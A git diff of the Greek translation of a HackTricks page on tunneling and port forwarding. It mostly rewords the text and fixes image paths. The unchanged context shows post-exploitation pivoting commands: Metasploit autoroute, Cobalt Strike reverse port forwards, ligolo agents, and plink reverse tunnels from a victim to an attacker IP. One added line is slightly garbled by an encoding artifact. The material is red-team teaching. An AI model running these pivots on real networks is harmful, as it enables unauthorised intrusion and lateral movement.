@@ -1,15 +1,15 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -103,8 +103,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Μπορείτε να **tunnel** μέσω **ssh** όλη την **κυκλοφορία** σε ένα **υποδίκτυο** μέσω ενός host.\
-Για παράδειγμα, προωθώντας όλη την κυκλοφορία που πηγαίνει στο 10.10.10.0/24
+Μπορείτε να **tunnel** μέσω **ssh** όλη την **κίνηση** σε ένα **υποδίκτυο** μέσω ενός host.\
+Για παράδειγμα, προωθώντας όλη την κίνηση που πηγαίνει στο 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -131,7 +131,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Άλλος τρόπος:
+Ένας άλλος τρόπος:
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -167,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
-- Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
-- **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
+* Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **δημιουργεί σήραγγες κυκλοφορίας προς τον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
+* Η κυκλοφορία είναι **συρραμμένη μέσα στην κυκλοφορία C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
+* **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
 ### rPort2Port local
 
 {% hint style="warning" %}
-Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον οικοδεσπότη beacon**, όχι στον Server Ομάδας και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Server Ομάδας) και από εκεί στον καθορισμένο host:port
+Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον υπολογιστή beacon**, όχι στον Team Server και η **κυκλοφορία αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Team Server) και από εκεί στον καθορισμένο host:port
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -235,7 +235,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Σύνδεση και Ακρόαση Πράκτορα
+### Σύνδεση και Ακρόαση του Πράκτορα
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh πελάτη).
 
-Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στον θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
+Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -374,18 +374,18 @@ C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 netstat -antb | findstr 1080
 ```
-Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του θύρας.**
+Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του πόρου.**
 
-## Προξενήστε εφαρμογές Windows GUI
+## Προξενίστε εφαρμογές Windows GUI
 
 Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
-Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τη θύρα του διακομιστή SOCKS.\
-Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις στις διευθύνσεις IP που θέλετε να προξενήσετε.
+Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τον πόρο του διακομιστή SOCKS.\
+Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις προς τις διευθύνσεις IP που θέλετε να προξενήσετε.
 
 ## Παράκαμψη proxy NTLM
 
-Το προηγουμένως αναφερόμενο εργαλείο: **Rpivot**\
-**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης.
+Το εργαλείο που αναφέρθηκε προηγουμένως: **Rpivot**\
+**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -402,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας του επιτιθέμενου 2222.\
+Τώρα, αν ρυθμίσετε για παράδειγμα στον θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας του επιτιθέμενου 2222.\
 Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
 
 ## YARP
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) είναι ένα εργαλείο για την έκθεση λύσεων στο Διαδίκτυο με μία γραμμή εντολής.**
-*Οι URI έκθεσης είναι όπως:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για να εκθέτει λύσεις στο Διαδίκτυο με μία γραμμή εντολής.**\
+&#xNAN;_&#x45;xposition URI είναι όπως:_ **UID.ngrok.io**
 
 ### Εγκατάσταση
 
-- Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
-- Λήψη πελάτη:
+* Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
+* Λήψη πελάτη:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο.*
+_Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο._
 
 #### Τούνελινγκ TCP
 ```bash
@@ -523,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### Sniffing HTTP calls
 
-*Χρήσιμο για XSS, SSRF, SSTI ...*
+_Χρήσιμο για XSS, SSRF, SSTI ..._\
 Απευθείας από το stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
@@ -536,8 +536,9 @@ chmod a+x ./ngrok
 #### ngrok.yaml απλή διαμόρφωση παράδειγμα
 
 Ανοίγει 3 τούνελ:
-- 2 TCP
-- 1 HTTP με στατική έκθεση αρχείων από /tmp/httpbin/
+
+* 2 TCP
+* 1 HTTP με στατική έκθεση αρχείων από /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Υποστήριξη HackTricks</summary>
 
 * Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
